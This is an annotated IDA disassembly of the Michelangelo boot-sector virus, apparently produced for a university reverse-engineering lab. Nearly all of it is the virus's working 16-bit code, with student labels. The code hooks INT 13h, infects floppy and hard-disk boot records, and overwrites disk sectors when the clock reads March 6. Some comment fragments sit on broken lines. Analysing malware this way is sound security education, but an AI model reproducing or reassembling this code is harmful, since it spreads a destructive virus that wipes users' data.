seg000:7C00 ;
seg000:7C00 ;
+-------------------------------------------------------------------------+
seg000:7C00 ; | This file was generated by The Interactive Disassembler (IDA)
|
seg000:7C00 ; | Copyright (c) 2019 Hex-Rays, <support@hex-rays.com>
|
seg000:7C00 ; | License info: 48-BABB-7E64-E2
|
seg000:7C00 ; | Georgia Institute of Technology
|
seg000:7C00 ;
+-------------------------------------------------------------------------+
seg000:7C00 ;
seg000:7C00 ; Input SHA256 :
B8A70F4A55E3EF8F59363FDF1F6ECD8761F3B8CEF8DB122EB0B2081B8C4CCD0E
seg000:7C00 ; Input MD5 : 3FFC402675E30C6E42560EAA0A90A2B7
seg000:7C00 ; Input CRC32 : 827C7725
seg000:7C00
seg000:7C00 ;
---------------------------------------------------------------------------
seg000:7C00 ; File Name : /nethome/fzhou65/lab_2/michelangelo.1
seg000:7C00 ; Format : Binary file
seg000:7C00 ; Base Address: 0000h Range: 7C00h - 7E00h Loaded length: 0200h
seg000:7C00
seg000:7C00 .686p
seg000:7C00 .mmx
seg000:7C00 .model flat
seg000:7C00
seg000:7C00 ;
===========================================================================
seg000:7C00
seg000:7C00 ; Segment type: Pure code
seg000:7C00 seg000 segment byte public 'CODE' use16
seg000:7C00 assume cs:seg000
seg000:7C00 ;org 7C00h
seg000:7C00 assume es:nothing, ss:nothing, ds:nothing, fs:nothing,
gs:nothing
seg000:7C00 jmp hijack_int13_and_copy_itself 
seg000:7C00 ;
---------------------------------------------------------------------------
seg000:7C03 jumpoffset db 0F5h ; DATA XREF: seg000:7CF0↓r
seg000:7C04 db 0
seg000:7C05 info dw 0 ; DATA XREF: seg000:7CD8↓w
seg000:7C07 db 2, 0Eh, 0
seg000:7C0A int13offset dw 9739h ; DATA XREF: seg000:7CC1↓w
seg000:7C0C int13segment dw 0F000h ; DATA XREF: seg000:7CC7↓w
seg000:7C0E ;
---------------------------------------------------------------------------
seg000:7C0E
seg000:7C0E hijacked_int13: ; THIS IS THE START OF THE
HIJACKED INT13
seg000:7C0E push ds 
seg000:7C0F push ax 
seg000:7C10 or dl, dl
seg000:7C12 jnz short normal_int13 
seg000:7C14 xor ax, ax 
seg000:7C16 mov ds, ax
seg000:7C18 test byte ptr ds:43Fh, 1
seg000:7C1D jnz short normal_int13 
seg000:7C1F pop ax 
seg000:7C20 pop ds 
seg000:7C21 pushf 
seg000:7C22 call dword ptr cs:0Ah 
seg000:7C28 call infect_floppy 
seg000:7C2B popf 
infected the floppy
seg000:7C2C retf 2 
seg000:7C2F ;
---------------------------------------------------------------------------
seg000:7C2F
seg000:7C2F normal_int13: ; CODE XREF: seg000:7C12↑j
seg000:7C2F ; seg000:7C1D↑j
seg000:7C2F pop ax 
seg000:7C30 pop ds ; restore ds
seg000:7C31 jmp dword ptr cs:0Ah 
seg000:7C36
seg000:7C36 ; =============== S U B R O U T I N E
=======================================
seg000:7C36
seg000:7C36
seg000:7C36 infect_floppy proc near ; CODE XREF: seg000:7C28↑p
seg000:7C36 push ax 
seg000:7C37 push bx 
seg000:7C38 push cx 
seg000:7C39 push dx 
seg000:7C3A push ds 
seg000:7C3B push es
seg000:7C3C push si 
seg000:7C3D push di 
don't have to worry about overwrite registers
seg000:7C3E push cs 
can set ds = cs
seg000:7C3F pop ds
seg000:7C40 push cs 
can set es = cs
seg000:7C41 pop es 
seg000:7C42 mov si, 4
seg000:7C45
seg000:7C45 copy_floppy_mbr_to_mem: ; CODE XREF: infect_floppy+29↓j
seg000:7C45 mov ax, 201h
seg000:7C48 mov bx, 200h 
seg000:7C4B mov cx, 1 
seg000:7C4E xor dx, dx 
seg000:7C50 pushf 
seg000:7C51 call dword ptr ds:0Ah
seg000:7C55 jnb short test_infected 
seg000:7C57 xor ax, ax
seg000:7C59 pushf 
seg000:7C5A call dword ptr ds:0Ah 
seg000:7C5E dec si 
seg000:7C5F jnz short copy_floppy_mbr_to_mem
seg000:7C61 jmp short finish_abnormal_int13 
seg000:7C63 ;
---------------------------------------------------------------------------
seg000:7C63
seg000:7C63 test_infected: ; CODE XREF: infect_floppy+1F↑j
seg000:7C63 xor si, si 
seg000:7C65 cld 
seg000:7C66 lodsw
seg000:7C67 cmp ax, [bx]
seg000:7C69 jnz short start_floppy_infect 
seg000:7C6B lodsw 
seg000:7C6C cmp ax, [bx+2] 
seg000:7C6F jz short finish_abnormal_int13
seg000:7C71
seg000:7C71 start_floppy_infect: ; CODE XREF: infect_floppy+33↑j
seg000:7C71 mov ax, 301h
seg000:7C74 mov dh, 1 
seg000:7C76 mov cl, 3 
seg000:7C78 cmp byte ptr [bx+15h], 0FDh 
seg000:7C7C jz short floppy_infect 
seg000:7C7E mov cl, 0Eh
seg000:7C80
seg000:7C80 floppy_infect: ; CODE XREF: infect_floppy+46↑j
seg000:7C80 mov ds:8, cx 
seg000:7C84 pushf
seg000:7C85 call dword ptr ds:0Ah 
seg000:7C89 jb short finish_abnormal_int13 
seg000:7C8B mov si, 3BEh 
seg000:7C8E mov di, 1BEh
seg000:7C91 mov cx, 21h 
seg000:7C94 cld 
seg000:7C95 rep movsw
seg000:7C97 mov ax, 301h 
seg000:7C9A xor bx, bx
seg000:7C9C mov cx, 1
seg000:7C9F xor dx, dx
seg000:7CA1 pushf 
seg000:7CA2 call dword ptr ds:0Ah
seg000:7CA6
seg000:7CA6 finish_abnormal_int13:
seg000:7CA6 ; infect_floppy+39↑j ...
seg000:7CA6 pop di 
seg000:7CA7 pop si 
seg000:7CA8 pop es 
seg000:7CA9 pop ds
seg000:7CAA pop dx 
seg000:7CAB pop cx 
seg000:7CAC pop bx
seg000:7CAD pop ax 
seg000:7CAE retn 
seg000:7CAE infect_floppy endp
seg000:7CAE
seg000:7CAF ;
---------------------------------------------------------------------------
seg000:7CAF
seg000:7CAF hijack_int13_and_copy_itself: ; CODE XREF: seg000:7C00↑j
seg000:7CAF xor ax, ax
seg000:7CB1 mov ds, ax
seg000:7CB3 cli 
seg000:7CB4 mov ss, ax 
seg000:7CB6 mov ax, 7C00h
seg000:7CB9 mov sp, ax
seg000:7CBB sti 
seg000:7CBC push ds 
seg000:7CBD push ax 
seg000:7CBE mov ax, ds:4Ch
seg000:7CC1 mov ds:int13offset, ax
seg000:7CC4 mov ax, ds:4Eh
seg000:7CC7 mov ds:int13segment, ax
seg000:7CCA mov ax, ds:413h 
seg000:7CCD dec ax
seg000:7CCE dec ax
seg000:7CCF mov ds:413h, ax
seg000:7CD2 mov cl, 6 
seg000:7CD4 shl ax, cl 
seg000:7CD6 mov es, ax 
seg000:7CD8 mov ds:info, ax 
seg000:7CDB mov ax, 0Eh 
seg000:7CDE mov ds:4Ch, ax
seg000:7CE1 mov word ptr ds:4Eh, es 
seg000:7CE5 mov cx, 1BEh 
seg000:7CE8 mov si, 7C00h 
seg000:7CEB xor di, di 
seg000:7CED cld
seg000:7CEE rep movsb 
seg000:7CF0 jmp dword ptr cs:jumpoffset 
seg000:7CF5 ;
---------------------------------------------------------------------------
seg000:7CF5 xor ax, ax 
seg000:7CF7 mov es, ax 
seg000:7CF9 int 13h 
seg000:7CFB push cs 
seg000:7CFC pop ds 
seg000:7CFD mov ax, 201h 
seg000:7D00 mov bx, 7C00h 
seg000:7D03 mov cx, ds:8
seg000:7D07 cmp cx, 7 
seg000:7D0A jnz short boot_from_floppy 
seg000:7D0C mov dx, 80h 
0:7C00h
seg000:7D0F int 13h
seg000:7D11 jmp short done_setting_up_and_infecting 
seg000:7D13 ;
---------------------------------------------------------------------------
seg000:7D13
seg000:7D13 boot_from_floppy: ; CODE XREF: seg000:7D0A↑j
seg000:7D13 mov cx, ds:8 
seg000:7D17 mov dx, 100h 
seg000:7D1A int 13h
seg000:7D1C jb short done_setting_up_and_infecting
seg000:7D1E push cs
seg000:7D1F pop es 
seg000:7D20 mov ax, 201h 
seg000:7D23 mov bx, 200h 
seg000:7D26 mov cx, 1
seg000:7D29 mov dx, 80h
seg000:7D2C int 13h 
seg000:7D2E jb short done_setting_up_and_infecting
seg000:7D30 xor si, si 
seg000:7D32 cld 
seg000:7D33 lodsw 
seg000:7D34 cmp ax, [bx] 
seg000:7D36 jnz short infect_hd
seg000:7D39 cmp ax, [bx+2] 
seg000:7D3C jnz short infect_hd
seg000:7D3E done_setting_up_and_infecting: ; CODE XREF: seg000:7D11↑j
seg000:7D3E 
seg000:7D3E xor cx, cx 
seg000:7D40 mov ah, 4
seg000:7D42 int 1Ah
seg000:7D42 
seg000:7D42 
seg000:7D42
seg000:7D42 
seg000:7D44 cmp dx, 306h 
seg000:7D48 jz short Michelangelo_StArTs_yEeTin
seg000:7D4A retf 
seg000:7D4B ;
---------------------------------------------------------------------------
seg000:7D4B
seg000:7D4B Michelangelo_StArTs_yEeTin: ; CODE XREF: seg000:7D48↑j
seg000:7D4B xor dx, dx 
seg000:7D4D mov cx, 1 
seg000:7D50
seg000:7D50 where_virus_isLoadedFrom: ; CODE XREF: seg000:7D7F↓j
seg000:7D50 ; seg000:7D85↓j
seg000:7D50 mov ax, 309h
from floppy disk
seg000:7D53 mov si, ds:8 
seg000:7D57 cmp si, 3
seg000:7D5A jz short i_am_inevitable 
seg000:7D5C mov al, 0Eh 
seg000:7D5E cmp si, 0Eh
seg000:7D61 jz short i_am_inevitable 
seg000:7D63 mov dl, 80h
seg000:7D65 mov byte ptr ds:7, 4 
seg000:7D6A mov al, 11h 
seg000:7D6C
seg000:7D6C i_am_inevitable: ; CODE XREF: seg000:7D5A↑j
seg000:7D6C ; seg000:7D61↑j
seg000:7D6C mov bx, 5000h
seg000:7D6F mov es, bx
seg000:7D71 assume es:nothing
seg000:7D71 int 13h
seg000:7D73 jnb short step_head_and_track
seg000:7D75 xor ah, ah 
seg000:7D77 int 13h 
seg000:7D77 
seg000:7D79
seg000:7D79 step_head_and_track: ; CODE XREF: seg000:7D73↑j
seg000:7D79 inc dh
seg000:7D7B cmp dh, ds:7 
seg000:7D7F jb short where_virus_isLoadedFrom 
seg000:7D81 xor dh, dh
seg000:7D83 inc ch 
seg000:7D85 jmp short where_virus_isLoadedFrom 
seg000:7D87 ;
---------------------------------------------------------------------------
seg000:7D87
seg000:7D87 infect_hd: ; CODE XREF: seg000:7D36↑j
seg000:7D87 ; seg000:7D3C↑j
seg000:7D87 mov cx, 7 
seg000:7D8A mov ds:8, cx 
seg000:7D8E mov ax, 301h 
seg000:7D91 mov dx, 80h 
seg000:7D94 int 13h
seg000:7D96 jb short done_setting_up_and_infecting
seg000:7D98 mov si, 3BEh
seg000:7D9B mov di, 1BEh 
seg000:7D9E mov cx, 21h 
seg000:7DA1 rep movsw 
seg000:7DA3 mov ax, 301h 
seg000:7DA6 xor bx, bx 
seg000:7DA8 inc cl 
seg000:7DAA int 13h 
seg000:7DAC jmp short done_setting_up_and_infecting
seg000:7DAC ;
---------------------------------------------------------------------------
seg000:7DAE db 50h dup(0), 55h, 0AAh
seg000:7DAE seg000 ends
seg000:7DAE
seg000:7DAE

seg000:7DAE end